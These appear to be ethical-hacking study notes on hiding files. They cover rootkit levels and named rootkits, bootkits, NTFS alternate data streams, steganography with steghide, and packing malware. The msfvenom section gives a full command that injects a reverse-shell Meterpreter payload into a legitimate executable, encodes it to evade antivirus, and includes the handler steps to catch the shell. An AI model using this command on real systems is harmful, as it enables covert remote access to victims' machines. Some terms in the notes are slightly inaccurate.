# Hiding files

- Attacker attempts to cover their tracks in order to ensure future access to the system.

## Rootkits

- 📝 Creates backdoor to the system to enable the attacker to access to the system.
- Hides itself for not being detected, can e.g.
  - remove itself from the process list
  - replace certain system calls and utilities
- Do not spread by themselves.
  - Usually hidden in other software, waiting to be executed
- 💡 Best alternative for recovery is to wipe and reload from a known-good media.
- See also [Rootkit Trojans](./../07-malware/trojans.md#rootkit-trojans)

### Rootkit objectives

- Gaining remote backdoor access
- Hiding traces of the attack
- Collect confidential data
- Install other malicious programs on the machine

### Rootkit levels

- **Hypervisor level**
  - Acts as a hypervisor and load the target OS as a virtual machine.
- **Hardware/firmware**
  - Conceal itself in hardware devices that are not inspected
  - E.g. in a [motherboard firmware](https://www.theregister.com/2018/09/28/uefi_rootkit_apt28) used to spy against governments
- **Kernel level**
  - Replaces portions of OS code or adds new malicious core to it.
  - Hard to detect as they run with OS privileges (ring 0)
  - E.g. [Linux Mint website was hacked](https://www.zdnet.com/article/hacker-hundreds-were-tricked-into-installing-linux-mint-backdoor/) to distribute ISO files with malicious kernel.
- **Boot loader level**
  - Replaces the original bootloader with a malicious one
- **Application level**
  - Changes the behavior of the target application
- **Library level**
  - Designed to replace the original system calls in order to hide the attacker's activities
- ![Privilege rings for the x86 available in protected mode](img/privilege-rings-x86png.png)

### Popular rootkits

- **Horse Pill**, [slides](https://www.blackhat.com/docs/us-16/materials/us-16-Leibowitz-Horse-Pill-A-New-Type-Of-Linux-Rootkit.pdf), [code](https://github.com/r00tkillah/HORSEPILL)
  - Linux rootkit that:
    1. Infects systems via the initial RAM disk (drive)
    2. Deceives system owners using container primitives.
- **GrayFish**
  - Rootkit suspectedly used by NSA in USA in attacks against e.g. Iran.
  - Implanting hard drive firmware to gain access by MBR substitution
- **ZeroAccess / Sirefef**
  - Kernel-mode rootkit. That
    - Hides the infected driver on the disk
    - Enables read and write access to the encrypted files
  - Downloads other malware on an infected machine from a P2P botnet.
- **Necurs**
  - Infector and rootkit with worlds largest P2P botnet
  - Distributes many malware, including [Locky](https://en.wikipedia.org/wiki/Locky) ransomware.
  - [Taken down](https://blogs.microsoft.com/on-the-issues/2020/03/10/necurs-botnet-cyber-crime-disrupt/) by Microsoft and its partners in 2019
- **Grayfish**
  - Developed by Equation Group that's considered to be part of the NSA.

### Bootkit

- Kernel-mode rootkit that runs every time computer runs
- Can bypass code signing (kernel-level) in Windows by attaching itself to the master boot record (MBR) of a hard drive
  - Then the rootkit is able to modify boot sequences and other options
  - Allows rootkit to be loaded before the Windows kernel is loaded
- See also [boot sector infectors](./../07-malware/viruses.md#boot-sector-infectors)

## NTFS file system

### NTFS Data Stream

- Two data streams that help NTFS store files.
  1. Stores data about the file (e.g. permissions)
  2. Stores file data

### Alternate data stream (ADS)

- Stream that's not in the file but attached to file through the Master File Table
  - the Master File Table contains a list of all file data streams and their locations on the disk
- Contains file metadata such as file attributes, author, access, and word count
- Enables attackers to inject malicious code into files and execute it
- Hard to detect because the file size and the contents remain the same.
  - Only way is to check the timestamps to detect tampering.

## Hiding files from GUI

- **Linux and macOS**
  - Prepend single dot (`.` ) in names of files/folders.
- **Windows**
  - Uses a file attribute named hidden for that
  - E.g. by using `ATTRIB +H` command
- Very easy to identify and display with command line or by changing GUI settings

## Steganography

- 📝 Technique which hides a message within another message.
  - E.g. an image that's still preserved but you embed your data into it.
- Used for maintaining information confidentiality
  - E.g. lighting a candle to reveal the secret message in the past.
- Implementations lacking a sharing secret are forms of security through obscurity
- Often reversible, hidden message is extracted when it arrives to its destination.
  - Or can be used to watermark to copyright of images, videos etc.
- Used by attackers to e.g. hide keyloggers, or inserting source code for hacking tools.
- Can be:
  - **Technical stenography**: uses scientific methods to hide messages
  - **Linguistic stenography**: uses a carrier to hide messages
- Can be: • Image • Document • Folder • Video • Audio • Web • Spam/email • DVD-ROM • Natural text • Hidden OS • Source Code

### Steganalysis

- Discovering of the hidden data in a medium
- Two phases
  1. **Detection**: ensuring existence of hidden information
  2. **Distortion**: trying to extract the hidden message
- Methods:
  - **Stego only attack**
    - Only the stego-object is available for analysis.
  - **Known stego attack**
    - Steganography algorithm is known and both the original and stego-object are available.
  - **Known message attack**
    - Hidden message and the corresponding stego-image are known.
    - The analysis of patterns that correspond to the hidden information could help decipher such messages in future.
  - **Known cover attack**
    - The stego-object as well as the original medium is available.
    - The stego-object is compared with the original cover object to detect any hidden information.
  - **Chosen message attack**
    - The steganalyst generates a stego-object from some stenography tool or algorithm of a chosen message.
    - The goal in this attack is to determine patterns in the stego-object that may point to the use of specific stenography tools or algorithms.
  - **Chosen stego attack**
    - The stenography algorithm and stego-object are known.

#### `steghide`

- [Tool](http://steghide.sourceforge.net/index.php) to embed and extract data from JPEG, BMP, WAV and AU.
- `steghide embed -cf test.jpg -ef hide-me.txt`
  - `-cf`: target file where the data will be hid
  - `-ef`: file to be embedded
  - Asks you for passphrase to encrypt the data
- `steghide extract -sf test.jpg`

### Packing Malware

- Embedding malware in other files (e.g. PDF, JPEG) to make it hidden
- Executable files to embed are good as they'll execute your malware when they're executed.
- You can do it
  - manually (hard to do, hard do detect)
  - or in a standardized way (automated, but detected easily)
- E.g. many crack files come with embedded malware.

#### `msfvenom`

- 📝 Payload generator and packer in [Metasploit framework](./../05-vulnerabilities/automated-penetration-testing-tools.md#metasploit).
- [Usage](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom) e.g. `msfvenom -a x86 --platform-windows -x /root/Downloads/someProgram.exe -k -p windows/meterpreter/reverse_tcp LHOST=192.168.122.110 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o program.exe`
  - `-x`: Executable that'll be patched (injected)
  - `-k`: Keep functionality in the program
  - `-p`: Payload to inject
    - In the example it's reverse shell that gives remote access.
    - Server becomes client (creates connection), client becomes server.
    - Victim communicates back to the attacking machine
  - `-e x86/shikata_ga_nai`: Encoder to avoid antivirus detection
  - `-i 3`: Encode 3 times for more stealth
  - Once it's executed you can start listening to the infected computer using:
    - [`msfconsole`](./../05-vulnerabilities/automated-penetration-testing-tools.md#msfconsole) to start listening to the IP address:
      - `use exploit/multi/handler`
      - `set payload windows/shell/reverse_tcp`
      - `set LHOST <target-ip-address>`
      - `set LPORT 4444`
      - `exploit`
- See also [MSFvenom | Automated penetration testing tools](./../05-vulnerabilities/automated-penetration-testing-tools.md#msfvenom)
